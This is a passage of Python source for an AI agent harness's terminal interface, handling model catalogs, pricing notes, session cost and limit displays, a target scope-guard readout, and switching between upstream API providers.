                if ic_catalog is None:
                    creds = ic_mod.load_credentials()
                    fetched, _ = ic_mod.fetch_models(creds[0] if creds else "")
                else:
                    fetched = list(ic_catalog)
            elif active == "infronai":
                # Keyless too: /v1/models answers with no credential. Fetched
                # rather than read from the cache when the cache is cold or
                # expired, so a live model is not refused against a stale list.
                if inf_catalog is None:
                    creds = inf_mod.load_credentials()
                    fetched, _ = inf_mod.fetch_models(creds[0] if creds else "")
                else:
                    fetched = list(inf_catalog)
            elif active == "nvidia":
                # Keyless as well, and filtered to chat entries: the raw Models
                # route carries embeddings, guards and parsers too, and offering
                # those as model choices would be offering a 400.
                if nv_catalog is None:
                    creds = nv_mod.load_credentials()
                    got, _ = nv_mod.fetch_models(creds[0] if creds else "")
                    fetched = [m for m in (got or []) if m.chat] or None
                else:
                    fetched = list(nv_catalog)
            elif active == "logfare":
                if lf_catalog is None:
                    # The status API is public — no key, so this works before
                    # anything has been authenticated.
                    fetched, _ = lf_mod.fetch_models()
                else:
                    fetched = list(lf_catalog)
            if fetched is not None:
                if active == "tokenharbour":
                    th_catalog = fetched
                elif active == "antseed":
                    as_catalog = fetched
                elif active == "unorouter":
                    uno_catalog = fetched
                elif active == "aihubmix":
                    ah_catalog = fetched
                elif active == "beatapi":
                    bp_catalog = fetched
                elif active == "iteracompute":
                    ic_catalog = fetched
                elif active == "infronai":
                    inf_catalog = fetched
                elif active == "nvidia":
                    nv_catalog = fetched
                elif active == "logfare":
                    lf_catalog = fetched
                models = tuple(m.id for m in fetched)
        # Only police this on a known source. A custom endpoint (ZIMZILLA_NO_PROXY,
        # a direct ANTHROPIC_BASE_URL) has no catalog to check against, and the
        # old behaviour — accept anything — is right there.
        if active and check_name not in models:
            self._sys_line(
                f"{name} is not served by {active} — see /model for the list",
                warn=True,
            )
            return
        self.cfg.model = name
        self.agent.set_model(name)
        self.query_one(HeaderBar).set_model(self.cfg.display_model)
        self.query_one(StatusBar).model = self.cfg.display_model
        self.query_one(StatusBar).render_bar()
        # Remember the choice when it is an AntSeed pin. Nothing else in the
        # TUI persists a model, because every other source's model name is a
        # plain string the catalog can hand back — but an AntSeed free model is
        # reached only through `<peerId>@<model>`, and a pin is not in the
        # catalog's id list. Without this the choice dies with the session and
        # the next launch lands back on a paid name and 402s, which is the
        # failure `/antseed-models` exists to avoid. Only saved when the peer
        # is actually pinned; a bare model name is not a preference.
        if active == "antseed" and "@" in name:
            peer, _, model = name.partition("@")
            if peer and model:
                as_mod.save_pin(model, peer)
        self._sys_line(f"model switched to {name}", ok=True)

    def _model_display_order(self, models, catalog) -> list[str]:
        """The /model list, free models first.

        Only the sources with a priced catalog have a free tier, and only their
        catalogs can tell free from paid — so the caller passes whichever one is
        live. That is the hosted gateways and IteraCompute, whose local proxy
        fronts a free Qwen tier. For every other source the catalog is None and
        this is the declared order unchanged, so the sort never reorders a list
        it has no prices for, which would look like a bug in Logfare's catalog.
        """
        ids = list(models)
        if not catalog:
            return ids
        free = {m.id for m in catalog if m.free}
        if not free:
            return ids
        # Stable: free models keep catalog order, then the rest keep theirs.
        # The current model is pinned to the top so it is never scrolled off.
        head = [m for m in ids if m == self.cfg.model]
        frees = [m for m in ids if m in free and m != self.cfg.model]
        rest = [m for m in ids if m not in free and m != self.cfg.model]
        return head + frees + rest

    def _model_note(self, name: str, catalog, lf_catalog=None,
                    as_catalog=None, uno_catalog=None, bp_catalog=None,
                    ic_catalog=None, inf_catalog=None,
                    nv_catalog=None) -> str:
        """The price/context note beside a model in /model.

        TokenHarbour's catalog is authoritative for its own models — it is the
        gateway's own price, not this harness's estimate — so it wins when
        present. Everywhere else the local estimate table answers, as before.

        Logfare's catalog has no prices, but it has something the estimate table
        cannot know: whether the model is actually up. A model Logfare reports as
        unstable is called out, so a degraded pick is a choice rather than a
        surprise three turns in.

        AntSeed's catalog is read last and is the only one that answers for a
        *pinned* id as well as a bare one, since the name on screen is
        ``<peerId>@<model>`` for a free model.

        UnoRouter's answers only for its free tier — its paid entries publish
        credit ratios, not rates, so they fall through to the estimate table
        rather than being converted into a dollar figure it never stated. Its
        note also carries the upstream channel count, which is the figure that
        decides whether the model answers at all: a free model with one channel
        behind it rate limits, and no price is worth knowing about a model that
        will not reply.
        """
        live = th_mod.price_for(name, catalog)
        if live is None:
            live = as_mod.price_for(name, as_catalog)
        if live is None:
            live = uno_mod.price_for(name, uno_catalog)
        if live is None:
            live = bp_mod.price_for(name, bp_catalog)
        if live is None:
            live = ic_mod.price_for(name, ic_catalog)
        if live is None:
            live = inf_mod.price_for(name, inf_catalog)
        if live is None:
            live = nv_mod.price_for(name, nv_catalog)
        if live is not None:
            pin, pout = live
            note = "free" if (pin == 0.0 and pout == 0.0) \
                else f"${pin:g}/${pout:g} per Mtok"
            return note + self._uno_upstream_clause(name, uno_catalog)
        if nv_mod.is_nvidia(self.cfg.base_url):
            # The catalog is cold, but the tier is not a guess: NVIDIA's hosted
            # catalog draws on the account's developer allowance and publishes
            # no per-model price. Falling through to the estimate table would
            # print $1.00/$3.00 beside a model that costs nothing.
            return "free (dev tier)"
        pin, pout = price_for(name)
        note = f"${pin:.2f}/${pout:.2f} per Mtok"
        health = lf_mod.health_for(name) if lf_catalog else None
        if health is not None and not health.healthy:
            note += f"  ·  {health.status}" if health.status else "  ·  degraded"
        return note

    def _uno_upstream_clause(self, name: str, uno_catalog) -> str:
        """``"  ·  1 upstream"`` for a UnoRouter model, or ``""``.

        A plain string rather than a coloured segment, because ``_model_note``
        returns one string that the caller renders in a single dim style — the
        colour lives in the ``/models`` list, where the row is built from parts.
        The count is the load-bearing half anyway: it is what the operator acts
        on, and it survives being printed without its colour.

        Empty whenever the catalog is absent or has no entry for *name* — the
        same silence ``Model.upstream_note`` keeps for an unread channel list.
        """
        if not uno_catalog:
            return ""
        for m in uno_catalog:
            if m.id == name:
                note = getattr(m, "upstream_note", "")
                return f"  ·  {note}" if note else ""
        return ""

    def _cmd_cost(self, args=None) -> None:
        p = self.palette
        a = self.agent
        # The catalog's rate, when the active source publishes one, so the
        # accounting matches the note beside the model in /model. A gateway's
        # own free model would otherwise be billed at DEFAULT_PRICE here while
        # /model called it free — the same discrepancy `Agent._prices` exists to
        # avoid in the per-turn figures.
        found = sources_mod.catalog_price_for(self.cfg.base_url, self.cfg.model)
        pin, pout = found if found is not None else price_for(self.cfg.model)
        t = Text()
        t.append("  SESSION ACCOUNTING\n\n", style=f"bold {p.accent}")
        for label, value in [
            ("model", self.cfg.display_model),
            ("turns", str(a.turn_count)),
            ("input tokens", f"{a.session_input_tokens:,}"),
            ("output tokens", f"{a.session_output_tokens:,}"),
            ("rate (in/out)", f"${pin:.2f} / ${pout:.2f} per Mtok"),
            ("last turn", f"${a.last_turn_cost:.4f}"),
        ]:
            t.append(f"  {label:<18}", style=p.dim)
            t.append(value + "\n", style=p.primary)
        t.append(f"  {'session total':<18}", style=p.dim)
        t.append(f"${a.session_cost:.4f}\n", style=f"bold {p.accent}")
        self.query_one(ChatPane).write_block(t)

    def _cmd_limits(self, args=None) -> None:
        """/limits — what this session will stop at, and where each number comes from.

        Every limit here has bitten at least once, and the reason they are worth
        a command is that they are otherwise invisible: a turn that ran out of
        rounds looked exactly like one that finished, and the context window was
        drawn on a gauge but never enforced. Naming the source of each figure
        matters as much as the figure — the window is per-model from the live
        catalog when the catalog knows, and the fallback when it does not.
        """
        p = self.palette
        a = self.agent
        window = a.context_window()
        from_catalog = window != self.cfg.context_window
        # The ceiling the turn actually uses, which is the catalog's figure when
        # the model publishes one and the configured value otherwise. Reporting
        # `cfg.max_tokens` here would name a number the agent does not send.
        ceiling = a.output_ceiling()
        used = a._last_input_tokens
        t = Text()
        t.append("  SESSION LIMITS\n\n", style=f"bold {p.accent}")
        rows = [
            ("context window", f"{window:,}",
             "from this model's catalog entry" if from_catalog
             else f"fallback (catalog has no figure for {self.cfg.display_model})"),
            ("last prompt", f"{used:,}" if used else "not measured yet",
             f"{used / window * 100:.1f}% of the window" if used else ""),
            ("auto-compact", "on" if self.cfg.auto_compact else "off",
             (f"at {a.compact_threshold(window):,} tokens "
              f"({self.cfg.compact_at:.0%} of the window"
              + (f", capped at {self.cfg.compact_tokens:,}" if self.cfg.compact_tokens else "")
              + ")")
             if self.cfg.auto_compact else "/compact still works by hand"),
            ("output ceiling", f"{ceiling:,}",
             "per reply; a reply cut off here is reported as truncated"
             + (" (the model's published limit)" if ceiling != self.cfg.max_tokens
                else "")),
            ("rounds before pause", f"{self.cfg.max_iterations}",
             "continues automatically while the turn is progressing"),
            ("hard round limit", f"{self.cfg.max_rounds}",
             "runaway guard; the turn stops and says so"),
            ("request timeout", f"{self.cfg.request_timeout:g}s",
             "bounds the gap between streamed chunks"),
        ]
        for label, value, note in rows:
            t.append(f"  {label:<20}", style=p.dim)
            t.append(f"{value:<14}", style=p.primary)
            if note:
                t.append(note, style=p.dim)
            t.append("\n")
        self.query_one(ChatPane).write_block(t)

    def _cmd_scope(self, args=None) -> None:
        p = self.palette
        s = self.agent.scope
        t = Text()
        t.append("  SCOPE GUARD\n\n", style=f"bold {p.accent}")

        if self.cfg.legacy_scope_path is not None:
            t.append("  ⚠ ", style=f"bold {p.amber}")
            t.append(f"{self.cfg.legacy_scope_path} is ignored\n", style=p.amber)
            t.append(
                "    the guard was split into allow.yaml / out-of-scope.yaml\n\n",
                style=p.dim,
            )

        def listing(title: str, path, hosts) -> None:
            t.append(f"  {title}\n", style=f"bold {p.accent}")
            t.append(f"    {'file':<10}", style=p.dim)
            t.append(f"{path if path else '(not found)'}\n", style=p.primary)
            if path is None:
                return
            for label, values in (
                ("domains", sorted(hosts.domains)),
                ("ips", sorted(hosts.ips)),
                ("cidrs", sorted(str(c) for c in hosts.cidrs)),
            ):
                if values:
                    t.append(f"    {label:<10}", style=p.dim)
                    t.append(", ".join(values) + "\n", style=p.primary)
            if hosts.empty:
                t.append(f"    {'entries':<10}", style=p.dim)
                t.append("(none)\n", style=p.amber)
            t.append("\n")

        t.append(f"  {'status':<12}", style=p.dim)
        if s.armed:
            t.append("ARMED", style=f"bold white on {p.red}")
            t.append(" — tools run unattended\n\n", style=p.primary)
        else:
            t.append("not armed", style=p.amber)
            t.append(" — normal mode gating applies\n\n", style=p.dim)

        listing("ALLOW  (declared targets — a declaration, not a fence)",
                s.allow_path, s.allow)
        listing("DENY   (never touched — enforced, beats allow)",
                s.deny_path, s.deny)

        t.append(
            "  Allow-list hosts are not restricted to: anything not in\n"
            "  out-of-scope.yaml is reachable. The deny-list is a static text\n"
            "  scan of the command, so obfuscated or runtime-built targets\n"
            "  (python3 -c, $(), encoded hosts) are not detected.\n",
            style=p.dim,
        )
        self.query_one(ChatPane).write_block(t)

    def _set_rain(self, active: bool) -> None:
        """Turn the rain animation on/off (paused during active turns)."""
        self.query_one(ChatPane).set_rain(active)

    def _cmd_rain(self, args=None) -> None:
        self.rain_on = not self.rain_on
        self._set_rain(self.rain_on and not self.busy)
        self._sys_line(f"matrix rain {'ON' if self.rain_on else 'OFF'}", ok=True)

    def _cmd_think(self, args=None) -> None:
        """Toggle the model's reasoning display.

        Says which endpoint is in play, because "OFF" and "the endpoint sends
        no reasoning" look identical on screen — and the second one is not
        something the toggle can fix.
        """
        self.cfg.show_thinking = not self.cfg.show_thinking
        if not self.cfg.show_thinking:
            self.query_one(ChatPane).clear_reasoning()
        self._sys_line(
            f"model thinking {'ON' if self.cfg.show_thinking else 'OFF'}",
            ok=True,
        )
        if self.cfg.show_thinking:
            self._sys_line(
                "shown only when the endpoint forwards it — an Anthropic-native "
                "one does; a LiteLLM proxy's /v1/messages bridge drops it"
            )

    def _cmd_effort(self, args) -> None:
        """/effort [low|medium|high|off] — how hard the current model thinks.

        The level is translated per protocol when the request is built (see
        ``zimzilla/effort.py``), so this handler only validates, stores and
        reports. Two things it says out loud instead of implying:

        * what will actually go on the wire for *this* route, because an
          ``effort`` field and an enabled thinking budget are different things
          and only one of them is visible in the transcript;
        * that a model without the knob drops it and reports the drop on the
          first request — that is the agent's existing retry, not a failed turn.

        Safe mid-turn: the field is read when the next request is assembled, so
        raising effort during a long answer takes effect on the next round.
        """
        p = self.palette
        if not args:
            current = self.cfg.reasoning_effort
            t = Text()
            t.append("  REASONING EFFORT\n\n", style=f"bold {p.accent}")
            t.append("  now          ", style=p.dim)
            t.append(f"{current or 'off'}\n", style=f"bold {p.primary}")
            t.append("  on the wire  ", style=p.dim)
            t.append(
                effort_mod.describe(current, self.agent.protocol,
                                    self.agent.output_ceiling()) + "\n\n",
                style=p.primary)
            for name in effort_mod.LEVEL_ORDER:
                spec = effort_mod.LEVELS[name]
                mark = "◉" if name == current else "○"
                style = f"bold {p.accent}" if name == current else p.primary
                t.append(f"  {mark} {name:<8}", style=style)
                t.append(spec.blurb + "\n", style=p.dim)
            t.append("\n  set it with  ", style=p.dim)
            t.append("/effort low|medium|high\n", style=f"bold {p.primary}")
            t.append("  turn it off with  ", style=p.dim)
            t.append("/effort off\n", style=f"bold {p.primary}")
            t.append("  remembered   ", style=p.dim)
            t.append(f"{effort_mod.pref_file()}\n", style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return

        ok, message = effort_mod.validate(str(args[0]))
        if not ok:
            self._sys_line(message, warn=True)
            return
        level = effort_mod.normalise(str(args[0]))
        self.cfg.reasoning_effort = level
        effort_mod.persist(level)
        if level is None:
            self._sys_line(
                "effort off — nothing sent, the model's own default", ok=True)
            return
        self._sys_line(
            f"effort {level} — "
            + effort_mod.describe(level, self.agent.protocol,
                                  self.agent.output_ceiling()),
            ok=True)
        self._sys_line(
            "a model without this knob drops it and says so on the first "
            "request — that is not a failed turn")

    def _cmd_theme(self, args) -> None:
        if not args:
            self._sys_line("usage: /theme " + " | ".join(THEME_NAMES), warn=True)
            return
        name = args[0].lower()
        if name not in THEME_NAMES:
            self._sys_line(f"unknown theme: {name}", warn=True)
            return
        self.theme_name = name
        self.palette = get_palette(name, self.term_bg, colors=self.term_colors)
        # Persist BEFORE applying, so the choice survives even if the repaint
        # below throws — a theme that took effect but was not remembered is the
        # worse of the two failures.
        set_current_theme(name)
        self._apply_palette()

        if name == SYSTEM_THEME and self.term_colors is None:
            # Say so rather than showing green under a "theme:system" badge.
            # A terminal that does not answer OSC 4 is a real thing, and the
            # operator would otherwise have no way to tell why nothing changed.
            self._sys_line(
                "theme switched to system — but this terminal did not report "
                "its colours, so the green palette is showing", warn=True)
            return
        self._sys_line(f"theme switched to {name}", ok=True)

    # ---- upstream sources ------------------------------------------------
    # Token Juice is parked: its unlimited quota is finished, so /zim-tokenjuice
    # no longer switches anything. It answers with where the route went instead
    # — the other unlimited sources — and, since a key may still be worth
    # storing while the route is dark, the `<tj_ key>` argument is still saved.
    # Delete this and restore the plain dispatch when the quota comes back.
    def _cmd_tokenjuice_paused(self, args: list[str] | None = None) -> None:
        """/zim-tokenjuice — Token Juice's unlimited quota has run out.

        The switch is refused, and the alternatives named in the same breath, so
        the operator gets a next step and not just a refusal. A ``tj_`` key is
        still saved (that write is local, and the profile is what the route uses
        the instant it is back), because the quota finishing is not a reason to
        lose a key that was just handed over.
        """
        token_arg = next((str(a).strip() for a in (args or [])
                          if sources_mod.is_tokenjuice_key(str(a))), None)
        if token_arg:
            try:
                path = sources_mod.save_token(token_arg)
            except OSError as e:
                self._sys_line(f"could not save the Token Juice key: {e}",
                               warn=True)
                return
            self._sys_line(
                f"Token Juice key saved to {path} (mode 600) — it will be the "
                f"key the route takes when the quota returns", ok=True)

        self._sys_line(
            "Token Juice unlimited quota finished — it will be back in a few "
            "days. Till then use the other unlimited sources: "
            "/zim-tokenharbour, /zim-nvidia, /zim-beatapi", warn=True)

    # /zim-logfare and /zim-tokenjuice repoint the session at a different
    # upstream. Both go down independently, so this is the failover: the key,
    # base_url and client are all rebuilt in place, and the choice is persisted
    # so the next launch starts on the one that worked. Logfare is a local
    # proxy; Token Juice is reached directly and has none.
    #
    # Logfare is a full switch target. Its key is shared, so it can hit the
    # upstream's daily budget — a 429 that the turn path reports rather than
    # retries — but that is a reason to say so when it happens, not a reason to
    # refuse the route.
    def _cmd_zim_source(self, key: str | None, args: list[str] | None = None) -> None:
        """/zim-<source> [proxy] — switch upstream, directly when possible."""
        p = self.palette
        found = sources_mod.discover()
        use_proxy = any(str(a).strip().lower() == "proxy" for a in (args or []))

        # /zim-tokenjuice <tj_ key> replaces the key before switching. The
        # shared profile in the tree makes the route work out of the box, but a
        # rotated or mistyped key has to be replaceable without editing a file
        # by hand — and the personal profile always wins over the shared one.
        if key == "tokenjuice":
            token_arg = next((str(a).strip() for a in (args or [])
                              if sources_mod.is_tokenjuice_key(str(a))), None)
            if token_arg:
                try:
                    path = sources_mod.save_token(token_arg)
                except OSError as e:
                    self._sys_line(
                        f"could not save the Token Juice key: {e}", warn=True)
                    return
                self._sys_line(f"Token Juice key saved to {path} (mode 600)",
                               ok=True)
                found = sources_mod.discover()

        if key is None:
            # Bare /zim-source: just show what is available and which is live.
            active = sources_mod.active_key(self.cfg.base_url)
            t = Text()
            t.append("  UPSTREAM SOURCES\n\n", style=f"bold {p.accent}")
            for k, src in found.items():
                mark = "◉" if k == active else "○"
                style = f"bold {p.accent}" if k == active else p.primary
                t.append(f"  {mark} {k:<12}", style=style)
                if src.is_direct_only:
                    # No proxy and no port: "proxy up" is not a question that
                    # can be asked, so the route is named instead.
                    route = sources_mod.direct_route(src)
                    t.append(f"{'direct':<7}{src.label:<12} ", style=p.primary)
                    where = route.base_url if route is not None else "no route"
                    t.append(f"no proxy · {where}\n", style=p.accent)
                else:
                    up = sources_mod.proxy_healthy(src.port)
                    state = "proxy up" if up else "proxy down"
                    t.append(f":{src.port}  {src.label:<12} ", style=p.primary)
                    t.append(f"{state}\n", style=p.accent if up else p.amber)
                if src.under_construction:
                    # Not offered as a switch target — the reason sits under
                    # the row rather than replacing its state, because "proxy
                    # up" is still true and still worth knowing.
                    t.append(f"      under construction: {src.under_construction}\n",
                             style=p.amber)
            # Token Juice is still discovered and still reachable, so its row
            # above reads as switchable — say under it why /zim-tokenjuice
            # refuses, rather than leaving two surfaces to disagree.
            if "tokenjuice" in found:
                t.append("      unlimited quota finished — /zim-tokenjuice is "
                         "paused, back in a few days\n", style=p.amber)
            # TokenHarbour has no port and no local proxy, so it is listed from
            # its credential rather than from discover() — "proxy up" is not a
            # question you can ask a hosted gateway.
            th = th_mod.load_credentials()
            mark = "◉" if active == "tokenharbour" else "○"
            style = f"bold {p.accent}" if active == "tokenharbour" else p.primary
            t.append(f"  {mark} {'tokenharbour':<12}", style=style)
            # Six spaces where the rows above carry ":4001  ", so the label
            # column lines up. "tokenharbour" is exactly the 12-wide key column,
            # so without this the two run together as "tokenharbourhosted".
            t.append("      hosted  TokenHarbour  ", style=p.primary)
            if th is None:
                t.append("no key — /tokenharbour-api-setup\n", style=p.amber)
            else:
                t.append(f"key from {th[2]}\n", style=p.accent)
            # OpenRouter and UnoRouter are hosted too, and were missing from this
            # list — it claims to show the upstreams and which is live, and a
            # source you cannot see is one you cannot switch to. Both list from
            # their credential, like TokenHarbour; UnoRouter additionally has a
            # public catalog, so "no key" is not a dead end for it.
            for _kind, _mod, _label, _setup in (
                ("openrouter", or_mod, "OpenRouter", "/openrouter-api-setup"),
                ("unorouter", uno_mod, "UnoRouter", "/unorouter-api-setup"),
                ("aihubmix", ah_mod, "AIHubMix", "/aihubmix-api-setup"),
                ("beatapi", bp_mod, "BeatAPI", "/beatapi-api-setup"),
                ("iteracompute", ic_mod, "IteraCompute",
                 "/iteracompute-api-setup"),
                ("infronai", inf_mod, "InfronAI", "/infronai-api-setup"),
                ("nvidia", nv_mod, "NVIDIA NIM", "/nvidia-api-setup"),
            ):
                # IteraCompute and InfronAI have local proxies, so when their
                # profiles exist they are already listed above by discover() —
                # with a port and a live health state, which is more than this
                # row could say. Listing one twice would make one source look
                # like two.
                if _kind in found:
                    continue
                creds = _mod.load_credentials()
                mark = "◉" if active == _kind else "○"
                style = f"bold {p.accent}" if active == _kind else p.primary
                t.append(f"  {mark} {_kind:<12}", style=style)
                if _kind in ("iteracompute", "infronai"):
                    # Not hosted: a local proxy whose profile is simply
                    # missing, so the port is the honest detail to show.
                    t.append(f":{_mod.PROXY_PORT}  {_label:<12} ",
                             style=p.primary)
                elif _kind == "nvidia":
                    # Neither hosted-by-us nor proxied: the upstream is reached
                    # directly, so the row says so the way Token Juice's does.
                    # There is no port, and "proxy down" would be a lie.
                    t.append(f"{'direct':<7}{_label:<12} ", style=p.primary)
                else:
                    t.append(f"      hosted  {_label:<12} ", style=p.primary)
                if creds is None:
                    t.append(f"no key — {_setup}\n", style=p.amber)
                else:
                    t.append(f"key from {creds[2]}\n", style=p.accent)
            # AntSeed is local like the LiteLLM proxies but has no discover()
            # entry and no key, so it is listed from its port being reachable —
            # the only question that has an answer here.
            port = as_mod.proxy_port()
            up = as_mod.reachable()
            mark = "◉" if active == "antseed" else "○"
            style = f"bold {p.accent}" if active == "antseed" else p.primary
            t.append(f"  {mark} {'antseed':<12}", style=style)
            t.append(f":{port}  AntSeed      ", style=p.primary)
            if up:
                t.append("buyer up (free peers, no key)\n", style=p.accent)
            else:
                t.append("no buyer — `antseed buyer start`\n", style=p.amber)
            # LDXHub is not a chat source — there is no Messages endpoint on
            # gw.ldxhub.io — so it is listed after the switchable ones and
            # never carries the active mark. The tools need a key; the
            # catalogs are public.
            creds = ldx_mod.load_credentials()
            t.append(f"  {'○':<1} {'ldxhub':<12}", style=p.primary)
            t.append("      tools   ", style=p.primary)
            t.append(f"{'LDXHub':<12} ", style=p.primary)
            if creds is None:
                t.append("no key — /ldxhub-api-setup (jobs; /ldxhub-models "
                         "browses free)\n", style=p.amber)
            else:
                t.append(f"key from {creds[2]} (document tools, not a source)\n",
                         style=p.accent)
            t.append("\n  wire protocol  ", style=p.dim)
            t.append(f"{self.agent.protocol}", style=f"bold {p.accent}")
            t.append(f"  ·  {self.cfg.base_url}\n", style=p.dim)
            t.append("  switch with  /zim-logfare,  /zim-tokenharbour,\n"
                     "                 /zim-openrouter,\n"
                     "                 /zim-unorouter,  /zim-aihubmix,\n"
                     "                 /zim-beatapi,  /zim-iteracompute,\n"
                     "                 /zim-infronai,  /zim-nvidia,\n"
                     "                 or  /zim-antseed\n",
                     style=p.dim)
            # Any route that is present but parked is named once here, so the
            # list above and this hint agree about what is actually reachable.
            for _k in sorted(sources_mod.UNDER_CONSTRUCTION):
                if _k in found:
                    t.append(f"  /zim-{_k} is under construction\n",
                             style=p.amber)
            self.query_one(ChatPane).write_block(t)
            return

        src = found.get(key)
        if src is None:
            # IteraCompute and InfronAI are the local proxies with no shipped
            # profile: they are missing until the operator sets their own key,
            # so the generic "profile, config or service missing" would leave
            # them with no next step. Name the command that creates it.
            if key in ("iteracompute", "infronai"):
                _label = "IteraCompute" if key == "iteracompute" else "InfronAI"
                self._sys_line(
                    f"{_label} is not set up on this machine — set your key "
                    f"with /{key}-api-setup <key>", warn=True)
                return
            if key == "tokenjuice":
                # No proxy files to miss: the profile is the whole install.
                self._sys_line(
                    "Token Juice is not set up on this machine — write your "
                    "tj_ key to ~/.zimzilla/tokenjuice/source (mode 600); the "
                    "format is in source.example beside it", warn=True)
                return
            if key == "nvidia":
                # Same shape as Token Juice — the profile IS the install — but
                # there is no shipped fallback, so the next step is the command
                # that writes one rather than a file path.
                self._sys_line(
                    "NVIDIA is not set up on this machine — set your key with "
                    "/nvidia-api-setup <key> (free at build.nvidia.com)", warn=True)
                return
            self._sys_line(
                f"source '{key}' is not available — profile, config or service missing",
                warn=True,
            )
            return

        if src.under_construction:
            self._sys_line(
                f"{src.label} is under construction and cannot be switched to — "
                f"{src.under_construction}",
                warn=True,
            )
            return

        if src.is_direct_only and use_proxy:
            # There is no proxy to ask for: the upstream serves Chat Completions
            # and nothing is installed in front of it. Say so, then switch the
            # way the route actually works rather than refusing the command.
            self._sys_line(
                f"{src.label} has no local proxy — it is reached directly",
                warn=True)
            use_proxy = False

        if sources_mod.active_key(self.cfg.base_url) == key:
            route = sources_mod.direct_route(src)
            direct_url = route.base_url.rstrip("/") if route is not None else ""
            on_proxy = (not src.is_direct_only
                        and self.cfg.base_url.rstrip("/") == src.base_url)
            on_direct = bool(direct_url) and \
                self.cfg.base_url.rstrip("/") == direct_url
            # `proxy` asks for the hop explicitly, so being on the direct route
            # already is not a reason to refuse it — and vice versa.
            if (on_proxy and use_proxy) or (on_direct and not use_proxy):
                where = f":{src.port}" if on_proxy else "directly"
                self._sys_line(f"already on {src.label} ({where})", ok=True)
                return

        self._switch_source(src, use_proxy=use_proxy)

    @work(exclusive=True)
    async def _switch_source(self, src, use_proxy: bool = False) -> None:
        """Rebuild the client on *src* — directly, unless the proxy is asked for.

        A source is a local LiteLLM proxy in front of an OpenAI-compatible
        upstream, and its config already names that upstream. The harness speaks
        Chat Completions itself now, so the proxy is a hop that costs a
        round-trip per streamed chunk and reassembles tool calls on the way —
        the one thing that must not be reassembled. Direct is therefore the
        default; `proxy` is there for the cases the proxy still earns its keep
        (a local audit of the traffic, or an upstream that needs its translation
        for a model whose Chat Completions route is broken).

        A direct-only source has no proxy to fall back to: its route is the
        only route, and it is always taken.
        """
        if src.is_direct_only:
            route = sources_mod.direct_route(src)
            if route is None:
                self._sys_line(
                    f"{src.label} has no route — nothing is configured to "
                    f"reach it", warn=True)
                return
            await self._switch_direct(src, route)
            return
        route = None if use_proxy else sources_mod.direct_route(src)
        if route is not None:
            await self._switch_direct(src, route)
            return
        if use_proxy:
            self._sys_line(f"{src.label}: using the local proxy, as asked")
        p = self.palette
        self.busy = True
        bar = self.query_one(StatusBar)
        bar.set_activity(f"switching to {src.label}", busy=True)
        self._sys_line(f"switching to {src.label} (:{src.port})…")
        try:
            ok, detail = await asyncio.to_thread(sources_mod.start_proxy, src)
        finally:
            self.busy = False
            bar.set_activity("idle", busy=False)
            bar.render_bar()
            self.query_one("#input", Input).focus()

        if not ok:
            self._sys_line(f"{src.label} proxy is not up: {detail}", warn=True)
            self._sys_line(
                f"start it with: {src.service} start", warn=True
            )
            return

        # The profile carries the key for this upstream. It is read here, never
        # printed — the transcript only ever sees the label and the port.
        profile = sources_mod.load_profile(src)
        token = profile.get("ANTHROPIC_AUTH_TOKEN") or None
        if not token:
            self._sys_line(
                f"{src.label} profile has no ANTHROPIC_AUTH_TOKEN: {src.profile}",
                warn=True,
            )
            return

        self.cfg.base_url = src.base_url
        # A local proxy speaks Messages by construction, whatever the operator
        # had pinned before. Leaving a manual `protocol = openai` in place would
        # send Chat Completions at a proxy that only serves /v1/messages.
        self.cfg.protocol = "auto"
        self.cfg.auth_token = token
        self.cfg.api_key = ""          # empty, so the auth_token stays authoritative
        # The profile's model is *stored* — written by hand at setup and never
        # revisited — so it can name a model the upstream has since retired.
        # `src.model` cannot: it is a constant in `sources._build`. Check the
        # stored one against the live catalog now, while this switch is already
        # paying for a round-trip, instead of letting the first turn find out
        # as a 404 from the upstream.
        chosen = profile.get("ANTHROPIC_MODEL") or src.model
        chosen, replaced = await self._verify_model_for(src, chosen)
        self.cfg.model = chosen
        if replaced:
            self._sys_line(
                f"{replaced} is no longer served by {src.label} — "
                f"using {chosen}", warn=True)
        # Drop the cached client so the next turn rebuilds against the new host.
        self.agent._client = None

        sources_mod.set_current(src.key)
        self._refresh_after_source_change(src.label, f":{src.port}, {detail}")

    async def _switch_direct(self, src, route) -> None:
        """Point the session at the source's upstream, with no proxy between.

        The key comes from the same profile the proxy would have used, so this
        changes the route and nothing else. The model is translated through the
        route's alias map — the upstream answers to its own ids, not a proxy's
        — and checked against the live catalog while the switch is already
        paying for a round-trip, because these lineups turn over and a retired
        name fails as a 404 on the first turn instead of here.
        """
        self.busy = True
        bar = self.query_one(StatusBar)
        bar.set_activity(f"switching to {src.label}", busy=True)
        self._sys_line(
            f"switching to {src.label} — direct, no proxy ({route.base_url})…")
        token: str | None = None
        chosen = route.upstream_model(src.model)
        replaced: str | None = None
        ok, detail = False, "catalog not checked"
        try:
            profile = sources_mod.load_profile(src)
            token = profile.get("ANTHROPIC_AUTH_TOKEN") or None
            if not token:
                self._sys_line(
                    f"{src.label} profile has no ANTHROPIC_AUTH_TOKEN: "
                    f"{src.profile}", warn=True)
                return
            wanted = profile.get("ANTHROPIC_MODEL") or src.model
            chosen, replaced, ok, detail = await asyncio.to_thread(
                self._probe_direct, src, route, route.upstream_model(wanted), token)
        finally:
            self.busy = False
            bar.set_activity("idle", busy=False)
            bar.render_bar()
            self.query_one("#input", Input).focus()

        self.cfg.base_url = route.base_url
        self.cfg.protocol = "openai"
        self.cfg.auth_token = token
        self.cfg.api_key = ""          # empty, so the auth_token stays authoritative
        self.cfg.model = chosen
        self.agent._client = None
        if replaced:
            self._sys_line(
                f"{replaced} is no longer served by {src.label} — "
                f"using {chosen}", warn=True)
        if not ok:
            # A rejected key is not a reason to switch: the current route still
            # works, and moving the session onto one that answers 401 would
            # turn a failed check into a failed turn.
            if "HTTP 401" in detail:
                self._sys_line(
                    f"{src.label} rejected the key (401) — staying on the "
                    f"current route. Replace it with {self._replace_key_hint(src)}.",
                    warn=True)
                return
            # An unreachable catalog is not evidence that the model was retired,
            # and refusing to switch on it would be worse than the 404 it is
            # trying to prevent.
            self._sys_line(f"  catalog check failed: {detail}", warn=True)
        sources_mod.set_current(src.key)
        self._refresh_after_source_change(
            src.label, f"direct, no proxy · {route.base_url}")

    @staticmethod
    def _replace_key_hint(src) -> str:
        """The command that replaces this source's key, for a 401 message.

        Parameterised because the message used to name ``/zim-tokenjuice``
        whatever source had refused: an operator on any other route was told to
        replace a key they were not using.
        """
        if src.key == "tokenjuice":
            return "/zim-tokenjuice <tj_ key>"
        if src.key == "nvidia":
